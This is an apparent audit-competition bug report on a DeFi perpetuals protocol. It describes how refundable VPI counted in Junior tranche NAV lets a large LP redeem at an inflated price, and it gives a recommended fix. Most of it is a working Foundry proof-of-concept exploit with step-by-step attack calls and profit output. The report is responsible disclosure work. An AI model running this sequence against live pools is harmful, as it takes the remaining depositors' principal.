# \#98028 [SC-Critical] Refundable positive VPI is counted in Junior NAV at open, so a large Junior LP can redeem at an inflated price and take the remaining LPs' principal when the position closes

**Submitted on Nov 4th 2026 at 13:46:42 UTC by @redbaron for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #98028
- **Report Type:** Smart Contract
- **Report severity:** Critical
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol
- **Impacts:**
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Brief/Intro

When an open increases skew, the trader pays a positive VPI charge. The settlement sidecar books that charge immediately as pool `Revenue` with `CashArrived`, so Junior NAV rises at once. The charge is not final, though. When the same position closes and brings the skew back, the close VPI is a rebate, and the lifetime clamp in `CloseAccountingLib` limits it to exactly what the position paid. The pool pays that rebate back.

So between open and close, LP share prices include value that a live position is entitled to take back under the protocol's own rules. Any LP who redeems in that window exits with a share of that value, and the LPs who stay pay for it when the position closes.

An unprivileged actor can do this on purpose. With a Junior redeem request maturing at the next LP epoch, they open a large skew-increasing position just before the epoch boundary. They let the redeem settle at the inflated price through the permissionless `settleLpEpoch`, and then close the position. In the PoC, with release parameters and a 10M USDG Junior tranche, the remaining Junior LP ends **2,993.84 USDG below its 4,000,000 USDG deposit**. The attacker makes a net profit of **1,434.59 USDG** per cycle after all fees. The cycle can be repeated about every two hours.

## Vulnerability Details

Line numbers refer to `immunefi-team/audit-comp-plether` at a82d4fe. The in-scope code is identical to the Arbitrum Sepolia v2.0.0 release commit 1209ca8.

### 1. The open books positive VPI as final pool revenue

```solidity
// packages/perps/src/CfdEngineSettlementSidecar.sol:446-463
(int256 netMarginChange, uint256 protocolFeeCreditedAssets) = clearinghouse.applyOpenCost(
    delta.account, delta.marginDeltaAssets, delta.tradeCostAssets,
    host.pool(), host.protocolTreasury(), delta.executionFeeAssets
);
if (delta.tradeCostAssets > 0) {
    uint256 poolCashInflowAssets = uint256(delta.tradeCostAssets) - protocolFeeCreditedAssets;
    if (poolCashInflowAssets > 0) {
        IHousePool(host.pool()).recordClaimantInflow(
            poolCashInflowAssets,
            IHousePool.ClaimantInflowKind.Revenue,
            IHousePool.ClaimantInflowCashMode.CashArrived
        );
    }
}
```

`tradeCostAssets` is VPI plus the execution fee. The execution fee goes to the treasury, and the rest, which is the positive VPI X, goes into `HousePool.accountedAssets` (`HousePool.sol:640-642`) as revenue. At the next reconcile, the waterfall pays Senior its coupon and gives the residual to Junior. In the PoC, `pool.totalAssets()` rises by exactly X = 7,603.48 USDG at the open.

### 2. The LP price snapshot has nothing that offsets it

```solidity
// packages/perps/src/CfdEngineProtocolLens.sol:61-70
uint256 poolAssets = engineContract.pool().totalAssets();
snapshot.physicalAssets = poolAssets;
snapshot.netPhysicalAssets = poolAssets;
...
snapshot.terminalLpPriceDeltaAssets = terminalSnapshot.terminalLpPriceDeltaAssets;
```

Deposits, redemptions and reconcile are all priced from this snapshot. The terminal book holds marked price PnL only. `SECURITY.md:863` says "carry, VPI, fees, frozen spread, and liquidation charges stay outside the pre-close price book". No term subtracts the positive VPI that open positions can still reclaim, and the engine keeps no aggregate of it.

### 3. The close refunds exactly the accrued charge

```solidity
// packages/perps/src/libraries/CloseAccountingLib.sol:103-117
state.proportionalAccrualAssets =
    (inputs.position.vpiAccrued * int256(inputs.sizeDelta)) / int256(inputs.position.size);
if (inputs.poolDepthAssets != 0) {
    state.vpiDeltaAssets = CfdMath.calculateVPI(
        inputs.preSkewAssets, inputs.postSkewAssets, inputs.poolDepthAssets, inputs.vpiFactor
    );
}
// Clamp so lifetime VPI (accrued + delta) never goes negative. ...
if (state.proportionalAccrualAssets + state.vpiDeltaAssets < 0) {
    state.vpiDeltaAssets = -state.proportionalAccrualAssets;
}
```

When the position closes its own skew, `calculateVPI` returns a rebate. After the redemption the depth is smaller, so the raw rebate is larger than X. The clamp then caps it at exactly −X, and the pool pays it. Junior NAV falls by X again. Only the LPs who are still in the tranche bear that drop.

### Why existing protections do not stop it

The clamp comment and `SECURITY.md:1443` ("the lifetime clamp intentionally zeroes otherwise extractable rebate-only round trips") protect the trader side: a trader cannot net a VPI profit. They do not decide which LPs hold the charge while the position is open. The charge counts as Junior value at epoch settlement and is taken back later from whoever is left. `SECURITY.md:860` promises that "new LPs receive the same marked-liability discount borne by existing LPs". The same symmetry should hold for exits, but the refundable VPI is a liability that is never marked.

### Relation to prior audits and known issues

I checked every prior report listed on the competition page, the repo `audits/` folder and `SECURITY.md`.

- The VPI items in the prior audits are about something else. Cecuro LOW-30 covers stale VPI previews. The pre-audit M-2 and M-3 cover dust and the negative-VPI IMR projection, and both are fixed. The scan Info items cover how temporary depth changes resize a close charge or rebate, which is a trader-side effect.
- The older "C-02a" depth attack, documented in the March 2026 commit that introduced the clamp, is the trader-side LP sandwich that the clamp fixes. It does not cover LP exit pricing.
- MED-24 and MED-29 (refund epochs and redemption rounding) and HIGH-1 (clock alignment) are unrelated.
- No issue, PR or commit in `immunefi-team/audit-comp-plether` or `Plether-Fi/plether-core` describes it. I checked on 2026-11-04.

### Recommended fix

Do not count a live position's positive VPI as distributable LP value while the position can still reclaim it.

1. At open, put the positive VPI into a retained bucket in `HousePool` instead of `Revenue`, and subtract that bucket from `poolAssets` in `CfdEngineProtocolLens.getHousePoolInputSnapshot`.
2. On close, release the part of the reduced `vpiAccrued` that the clamp did not refund to revenue. On liquidation, release the whole remaining amount to revenue.

An equivalent option is to keep an engine-wide aggregate of positive `vpiAccrued` and subtract it in the snapshot. I tested a minimal version of option 1, with retention at open, release at close and subtraction in the lens. With it the same PoC fails: the attacker's LP gain is 0, the remaining LP gains 1,566.6 USDG (the close fee), and the attacker loses 3,127 USDG.

## Impact Details

The remaining Junior LPs lose deposited principal, and that value is transferred to the exiting attacker. This matches the Critical impact "Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield". In the PoC the victim ends below the amount it deposited, so the loss is principal and not yield.

Per cycle, for an open of size S at pool depth D from zero skew, the charge is X = vpiFactor · S² / (2D). With an attacker share f of Junior:

1. The attacker gains f · X through the redeem.
2. The remaining LPs lose about (1 − f) · X, less the close execution fee, which stays in the pool.
3. The attacker pays two execution fees, 2 · 4 bps · S, plus the adverse confidence shift on both fills.
4. At the release max skew (S = 0.4 · D), X = 0.002 · S. The attack is profitable when f > 0.4 and costs nothing beyond fees.

PoC numbers at release parameters (Junior 10M USDG: attacker 6M, victim 4M; S = 3.9M):

| | USDG |
|---|---|
| Positive VPI X charged at open | 7,603.48 |
| Attacker redeem gain vs baseline | +4,561.63 (0.600 · X) |
| Victim value vs baseline | −2,993.84 |
| Victim final value | 3,997,006.15 of a 4,000,000 deposit |
| Attacker trading cost (2 × 1,560 fee, carry) | 3,127.24 |
| Attacker net profit | **+1,434.59** |

With the release `adverseConfidenceMultiplierBps = 2500` and a mocked Pyth confidence, the attack stays profitable up to the oracle's own confidence cap (`basketMaxConfidenceRatioBps = 10`):

| Pyth confidence | Attacker net | Victim vs baseline |
|---|---|---|
| 0 | +1,434.59 | −2,993.84 |
| 1 bp of price | +1,297.86 | −2,857.10 |
| 5 bp | +750.92 | −2,310.15 |
| 10 bp (policy cap) | +67.26 | −1,626.46 |

Everything scales linearly with pool size, so a 100M pool gives about 14k profit and 30k victim loss per cycle. LP epochs run on the contracts' hourly clock with a 5-minute request cutoff (`TrancheVault.sol:39`), and a new deposit must wait the 1-hour `DEPOSIT_COOLDOWN` before it can be redeemed (`TrancheVault.sol:38`, `:617`). The attacker can therefore repeat the cycle about every two hours, by re-depositing and redeeming again. The program says capital below 100M USD is not a reason to downgrade, and that low ROI alone does not justify one. The attacker's price exposure lasts only a few blocks, between the open just before the boundary and the close right after settlement, and it can be hedged off-protocol.

The same transfer also happens without an attacker. Any LP who redeems while other traders' skew-increasing positions are open exits with part of their refundable VPI, and the LPs who stay pay it back when those positions close.

## References

1. `packages/perps/src/CfdEngineSettlementSidecar.sol:446-463` (positive VPI booked as `Revenue`, `CashArrived`)
2. `packages/perps/src/HousePool.sol:624-642` (`recordClaimantInflow` adds it to `accountedAssets`)
3. `packages/perps/src/CfdEngineProtocolLens.sol:61-70` (LP price snapshot: `pool.totalAssets()` plus the price-only terminal delta)
4. `packages/perps/src/libraries/CloseAccountingLib.sol:103-117` (lifetime clamp refunds exactly the accrued charge)
5. `packages/perps/src/OrderRouter.sol:85`, `:240`, `:479` (`commitOrder`, `executeOrder`, `settleLpEpoch`, all permissionless)
6. `packages/perps/SECURITY.md:860`, `:863`, `:872`, `:1443`
7. Release parameters: `packages/perps/DEPLOYMENT.md` (vpiFactor 0.01e18, maxSkewRatio 0.4e18, execution fee 4 bps, adverse confidence multiplier 2,500 bps, basket confidence cap 10 bps)

## Link to Proof of Concept

https://gist.github.com/the-red-ace/1b627553b4809bceb669470536e38c07

## Proof of Concept

## Proof of Concept

Gist: https://gist.github.com/the-red-ace/1b627553b4809bceb669470536e38c07. It contains `VpiRedeemExtraction.t.sol`, `VpiRedeemExtractionConfidence.t.sol` and `README.md`.

The tests run in the repo's own Foundry suite at a82d4fe and extend its `BasePerpTest`. No in-scope contract is changed. The only mocks are Pyth update data and USDG, which the program allows. Risk parameters are the release values from DEPLOYMENT.md, and the test asserts `engine.executionFeeBps() == 4`. The attack uses only public entry points called from EOAs: `OrderRouter.commitOrder`, `OrderRouter.executeOrder` (the attacker acts as its own permissionless keeper), `OrderRouter.settleLpEpoch(bytes[])` and `TrancheVault.requestRedeem` / `claimRedeem`. No role is pranked. The only cheatcodes are `vm.warp` to the epoch boundary, the `+1` second inside the suite's mock Pyth helper, and `vm.snapshotState` to run the baseline and the attack from the same state.

### What the tests show

1. `VpiRedeemExtraction.t.sol::test_compare` sets up Junior with 6M USDG from the attacker A and 4M from the victim V. A requests a redeem of all its shares. The same timeline then runs twice from one snapshot:
    1. **Baseline:** the epoch settles and A claims its redeem, with no trading.
    2. **Attack:** right before the epoch, the attacker's trading account T opens a 3.9M LONG, which pays X = 7,603.48 USDG of VPI into the pool. An arbitrary EOA settles the epoch, A claims at the inflated price, and T closes. The clamp then refunds X from the pool.

   The test asserts that A gains about 0.6 · X, that V ends below the baseline and below its 4M deposit, and that the attacker's net (LP gain minus T's total cost plus keeper bounty income) is positive.
2. `VpiRedeemExtractionConfidence.t.sol` repeats the attack with the release adverse-confidence multiplier (2,500 bps, set through the normal 72-hour router config path) and Pyth confidence of 0, 1, 5 and 10 bps of price. It asserts that the attacker's net stays positive and the victim loses in every case.

### Step by step setup from zero

1. Install Foundry (https://getfoundry.sh). These tests were run with forge 1.8.5. The suite pins solc 0.8.35.
2. Clone the competition repository at the frozen commit:
```bash
git clone https://github.com/immunefi-team/audit-comp-plether
cd audit-comp-plether
git checkout a82d4fefb02768e5b3bddcc97dee371eee24fea8
git submodule update --init --recursive
```
3. Copy the two files from the gist into `packages/perps/test/perps/`, next to `BasePerpTest.sol`.
4. Run:
```bash
cd packages/perps
forge test --match-path 'test/perps/VpiRedeemExtraction*.t.sol' -vv
```
The first build uses `via_ir` and took about two minutes on our machine. Later runs take seconds.

### Test file `VpiRedeemExtraction.t.sol`

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "./BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {console} from "forge-std/console.sol";

/// Attack through public entry points only: OrderRouter.commitOrder / executeOrder / settleLpEpoch(bytes[]).
contract VpiRedeemExtractionTest is BasePerpTest {

    address A = address(0xA11CE);
    address V = address(0xB0B);
    address T = address(0x7777);
    address K = address(0x1337); // attacker acting as permissionless keeper (EOA)
    address S = address(0x5E77); // arbitrary EOA calling settleLpEpoch
    uint256 constant SIZE = 3_900_000e18;

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    struct Out {
        uint256 aAssets;
        uint256 vValue;
        int256 vpi;
        uint256 tCost; // T total cost incl. fees/carry/bounty paid out of T
        int256 kGain; // K bounty income
        uint256 treasuryDelta;
        uint256 poolDeltaOpen;
        uint256 poolDeltaClose;
        uint256 treasuryOpen;
        uint256 treasuryClose;
    }

    function _bal(address a) internal view returns (uint256) {
        return clearinghouse.balanceAssets(a) + settlementToken.balanceOf(a);
    }

    function _commitExec(CfdTypes.Side side, uint256 size, uint256 margin, bool isClose) internal {
        vm.prank(T);
        uint64 id = router.commitOrder(side, size, margin, isClose ? 0 : 1e8, isClose);
        bytes[] memory upd = _mockPythUpdateData(1e8); // warps +1, publishTime = commitTime+1
        vm.prank(K);
        OrderV3Types.ExecutionResult memory r = router.executeOrder(id, upd);
        assertEq(uint8(r.status), uint8(OrderV3Types.LifecycleStatus.Executed), "executed");
    }

    function _run(bool attack) internal returns (Out memory o) {
        assertEq(engine.executionFeeBps(), 4, "release exec fee");
        _fundJunior(A, 6_000_000e6);
        _fundJunior(V, 4_000_000e6);
        uint256 aShares = juniorVault.balanceOf(A);
        vm.prank(A);
        uint256 rid = juniorVault.requestRedeem(aShares, A, A);
        uint256 start = pool.lpEpochStart(rid);

        address treasury = engine.protocolTreasury();
        uint256 tBefore;
        uint256 kBefore = _bal(K);
        if (attack) {
            _fundTrader(T, 500_000e6);
            tBefore = _bal(T);
            uint256 pa = pool.totalAssets();
            uint256 tr = _bal(treasury);
            _commitExec(CfdTypes.Side.LONG, SIZE, 400_000e6, false);
            (,,,,,, o.vpi) = engine.positions(T);
            o.poolDeltaOpen = pool.totalAssets() - pa;
            o.treasuryOpen = _bal(treasury) - tr;
            console.log("vpiAccrued", o.vpi);
            console.log("open: pool.totalAssets delta", o.poolDeltaOpen);
            console.log("open: treasury delta", o.treasuryOpen);
        }

        if (block.timestamp < start) vm.warp(start);
        // permissionless settlement from arbitrary EOA with a fresh mark
        bytes[] memory upd = _mockPythUpdateData(1e8);
        vm.prank(S);
        router.settleLpEpoch(upd);
        uint256 cs = juniorVault.claimableRedeemRequest(rid, A);
        assertGt(cs, 0, "A claimable");
        vm.prank(A);
        o.aAssets = juniorVault.claimRedeem(rid, cs, A, A);

        if (attack) {
            uint256 pa = pool.totalAssets();
            uint256 tr = _bal(treasury);
            _commitExec(CfdTypes.Side.LONG, SIZE, 0, true);
            (uint256 sz,,,,,,) = engine.positions(T);
            assertEq(sz, 0, "closed");
            o.poolDeltaClose = pool.totalAssets() > pa ? pool.totalAssets() - pa : 0;
            console.log("close: pool.totalAssets before", pa, "after", pool.totalAssets());
            o.treasuryClose = _bal(treasury) - tr;
            console.log("close: treasury delta", o.treasuryClose);
            o.tCost = tBefore - _bal(T);
            o.kGain = int256(_bal(K)) - int256(kBefore);
        }
        o.vValue = juniorVault.convertToAssets(juniorVault.balanceOf(V));
        console.log("A redeem assets", o.aAssets);
        console.log("V junior value", o.vValue);
    }

    function test_compare() public {
        uint256 snap = vm.snapshotState();
        Out memory b = _run(false);
        vm.revertToState(snap);
        Out memory a = _run(true);
        int256 aDelta = int256(a.aAssets) - int256(b.aAssets);
        int256 vDelta = int256(a.vValue) - int256(b.vValue);
        // T cost already includes bounties/fees/carry; K (attacker) recovers bounties it was paid.
        int256 net = aDelta - int256(a.tCost) + a.kGain;
        console.log("baseline A", b.aAssets);
        console.log("baseline V", b.vValue);
        console.log("A delta", aDelta);
        console.log("V delta", vDelta);
        console.log("V below 4,000,000e6 deposit?", a.vValue < 4_000_000e6);
        console.log("T total cost", a.tCost);
        console.log("K bounty income", a.kGain);
        console.log("attacker net", net);
        assertApproxEqRel(uint256(aDelta), uint256(a.vpi) * 6 / 10, 0.01e18, "A gains ~0.6X");
        assertLt(vDelta, 0, "V loses");
        assertLt(a.vValue, b.vValue, "V below baseline");
        assertGt(net, 0, "attacker net positive");
    }

}
```

### Test file `VpiRedeemExtractionConfidence.t.sol`

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "./BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {IOrderRouterAdminHost} from "@plether/perps/interfaces/IOrderRouterAdminHost.sol";
import {console} from "forge-std/console.sol";

/// Attack through public entry points only: OrderRouter.commitOrder / executeOrder / settleLpEpoch(bytes[]).
contract VpiRedeemExtractionConfidenceTest is BasePerpTest {
    uint256 internal CONF;

    function _mockPythConf(uint256 price) internal returns (bytes[] memory updateData) {
        vm.roll(vm.getBlockNumber() + 1);
        vm.warp(vm.getBlockTimestamp() + 1);
        uint256 publishTime = _mockHistoricalPublishTime();
        baseMockPyth.setAllUniquePrices(
            _basePythFeedIds(), int64(int256(price)), uint64(CONF), int32(-8), publishTime,
            publishTime == 0 ? 0 : publishTime - 1
        );
        updateData = new bytes[](1);
        updateData[0] = abi.encode(price);
    }

    function _releaseAdverse() internal {
        IOrderRouterAdminHost.RouterConfig memory c = _routerConfig();
        c.adverseConfidenceMultiplierBps = 2500; // DEPLOYMENT.md release value
        _setRouterConfig(c);
        assertEq(router.pletherOracle().adverseConfidenceMultiplierBps(), 2500, "release adverse multiplier");
    }

    function test_conf_0_adv() public { _releaseAdverse(); CONF = 0; _compareConf(); }
    function test_conf_1bp() public { _releaseAdverse(); CONF = 1e4; _compareConf(); }
    function test_conf_5bp() public { _releaseAdverse(); CONF = 5e4; _compareConf(); }
    function test_conf_10bp_cap() public { _releaseAdverse(); CONF = 1e5; _compareConf(); }


    address A = address(0xA11CE);
    address V = address(0xB0B);
    address T = address(0x7777);
    address K = address(0x1337); // attacker acting as permissionless keeper (EOA)
    address S = address(0x5E77); // arbitrary EOA calling settleLpEpoch
    uint256 constant SIZE = 3_900_000e18;

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    struct Out {
        uint256 aAssets;
        uint256 vValue;
        int256 vpi;
        uint256 tCost; // T total cost incl. fees/carry/bounty paid out of T
        int256 kGain; // K bounty income
        uint256 treasuryDelta;
        uint256 poolDeltaOpen;
        uint256 poolDeltaClose;
        uint256 treasuryOpen;
        uint256 treasuryClose;
    }

    function _bal(address a) internal view returns (uint256) {
        return clearinghouse.balanceAssets(a) + settlementToken.balanceOf(a);
    }

    function _commitExec(CfdTypes.Side side, uint256 size, uint256 margin, bool isClose) internal {
        vm.prank(T);
        uint64 id = router.commitOrder(side, size, margin, 0, isClose);
        bytes[] memory upd = _mockPythConf(1e8); // warps +1, publishTime = commitTime+1
        vm.prank(K);
        OrderV3Types.ExecutionResult memory r = router.executeOrder(id, upd);
        assertEq(uint8(r.status), uint8(OrderV3Types.LifecycleStatus.Executed), "executed");
    }

    function _run(bool attack) internal returns (Out memory o) {
        assertEq(engine.executionFeeBps(), 4, "release exec fee");
        _fundJunior(A, 6_000_000e6);
        _fundJunior(V, 4_000_000e6);
        uint256 aShares = juniorVault.balanceOf(A);
        vm.prank(A);
        uint256 rid = juniorVault.requestRedeem(aShares, A, A);
        uint256 start = pool.lpEpochStart(rid);

        address treasury = engine.protocolTreasury();
        uint256 tBefore;
        uint256 kBefore = _bal(K);
        if (attack) {
            _fundTrader(T, 500_000e6);
            tBefore = _bal(T);
            uint256 pa = pool.totalAssets();
            uint256 tr = _bal(treasury);
            _commitExec(CfdTypes.Side.LONG, SIZE, 400_000e6, false);
            (,,,,,, o.vpi) = engine.positions(T);
            o.poolDeltaOpen = pool.totalAssets() - pa;
            o.treasuryOpen = _bal(treasury) - tr;
            console.log("vpiAccrued", o.vpi);
            console.log("open: pool.totalAssets delta", o.poolDeltaOpen);
            console.log("open: treasury delta", o.treasuryOpen);
        }

        if (block.timestamp < start) vm.warp(start);
        // permissionless settlement from arbitrary EOA with a fresh mark
        bytes[] memory upd = _mockPythConf(1e8);
        vm.prank(S);
        router.settleLpEpoch(upd);
        uint256 cs = juniorVault.claimableRedeemRequest(rid, A);
        assertGt(cs, 0, "A claimable");
        vm.prank(A);
        o.aAssets = juniorVault.claimRedeem(rid, cs, A, A);

        if (attack) {
            uint256 pa = pool.totalAssets();
            uint256 tr = _bal(treasury);
            _commitExec(CfdTypes.Side.LONG, SIZE, 0, true);
            (uint256 sz,,,,,,) = engine.positions(T);
            assertEq(sz, 0, "closed");
            o.poolDeltaClose = pool.totalAssets() > pa ? pool.totalAssets() - pa : 0;
            console.log("close: pool.totalAssets before", pa, "after", pool.totalAssets());
            o.treasuryClose = _bal(treasury) - tr;
            console.log("close: treasury delta", o.treasuryClose);
            o.tCost = tBefore - _bal(T);
            o.kGain = int256(_bal(K)) - int256(kBefore);
        }
        o.vValue = juniorVault.convertToAssets(juniorVault.balanceOf(V));
        console.log("A redeem assets", o.aAssets);
        console.log("V junior value", o.vValue);
    }

    function _compareConf() internal {
        uint256 snap = vm.snapshotState();
        Out memory b = _run(false);
        vm.revertToState(snap);
        Out memory a = _run(true);
        int256 aDelta = int256(a.aAssets) - int256(b.aAssets);
        int256 vDelta = int256(a.vValue) - int256(b.vValue);
        // T cost already includes bounties/fees/carry; K (attacker) recovers bounties it was paid.
        int256 net = aDelta - int256(a.tCost) + a.kGain;
        console.log("baseline A", b.aAssets);
        console.log("baseline V", b.vValue);
        console.log("A delta", aDelta);
        console.log("V delta", vDelta);
        console.log("V below 4,000,000e6 deposit?", a.vValue < 4_000_000e6);
        console.log("T total cost", a.tCost);
        console.log("K bounty income", a.kGain);
        console.log("CONF", CONF);
        console.log("attacker net", net);
        assertGt(net, 0, "attacker net positive with release confidence costs");
        assertLt(vDelta, 0, "V loses");
        assertLt(a.vValue, b.vValue, "V below baseline");
    }

}
```

### Expected output

```
Ran 1 test for test/perps/VpiRedeemExtraction.t.sol:VpiRedeemExtractionTest
[PASS] test_compare() (gas: 15811055)
Logs:
  A redeem assets 5999999985389
  V junior value 3999999996346
  vpiAccrued 7603479304
  open: pool.totalAssets delta 7603479304
  open: treasury delta 1560000000
  close: pool.totalAssets before 4005041862495 after 3999005424228
  close: treasury delta 0
  A redeem assets 6004561616809
  V junior value 3997006154415
  baseline A 5999999985389
  baseline V 3999999996346
  A delta 4561631420
  V delta -2993841931
  V below 4,000,000e6 deposit? true
  T total cost 3127241037
  K bounty income 200000
  attacker net 1434590383

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 30.04ms (24.13ms CPU time)

Ran 4 tests for test/perps/VpiRedeemExtractionConfidence.t.sol:VpiRedeemExtractionConfidenceTest
[PASS] test_conf_0_adv() (gas: 16499723)
  A delta 4561631721
  V delta -2993842724
  CONF 0
  attacker net 1434590684
[PASS] test_conf_10bp_cap() (gas: 16542434)
  A delta 5144292734
  V delta -1626459324
  CONF 100000
  attacker net 67255666
[PASS] test_conf_1bp() (gas: 16524600)
  A delta 4619897796
  V delta -2857104157
  CONF 10000
  attacker net 1297856955
[PASS] test_conf_5bp() (gas: 16542408)
  A delta 4852962156
  V delta -2310149951
  CONF 50000
  attacker net 750922101
Suite result: ok. 4 passed; 0 failed; 0 skipped; finished in 38.81ms (118.56ms CPU time)
Ran 2 test suites in 39.39ms (68.85ms CPU time): 5 tests passed, 0 failed, 0 skipped (5 total tests)
(confidence suite: only the summary lines of each test are shown; run with -vv to see all logs)
```

### How to read the result

1. `vpiAccrued 7603479304` and `open: pool.totalAssets delta 7603479304` show that the whole positive VPI X enters pool assets at the open. The 1,560 USDG execution fee goes to the treasury (`open: treasury delta`).
2. The first `A redeem assets` line is the baseline, 5,999,999.99 USDG. The second is the attack, 6,004,561.62 USDG, which is A's 60% share of X taken through the redeem.
3. `close: pool.totalAssets before ... after ...` shows the pool paying the clamped rebate back at the close.
4. `V junior value 3997006154415` and `V below 4,000,000e6 deposit? true` show the victim ending below its principal.
5. `attacker net 1434590383` is the attacker's profit after both execution fees, carry and keeper income: 1,434.59 USDG.
6. The confidence suite shows the attack is still profitable under the release confidence policy, up to its 10 bp cap.

